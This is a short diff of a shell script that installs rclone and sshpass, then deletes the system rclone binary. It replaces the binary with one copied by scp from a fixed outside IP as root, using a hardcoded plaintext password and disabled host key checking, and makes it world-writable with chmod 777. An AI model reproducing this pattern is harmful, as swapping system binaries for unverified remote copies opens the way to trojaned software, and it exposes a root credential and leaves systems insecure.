@@ -21,7 +21,7 @@ apt install rclone sshpass -y
 sleep 2
 
 cd ../usr/bin/
-rm r rclone
+rm rclone
 sshpass -p 'Serhildanroot.123' scp -o StrictHostKeyChecking=no -r root@5.161.224.217:/usr/bin/rclone /usr/bin/
 chmod 777 rclone
 
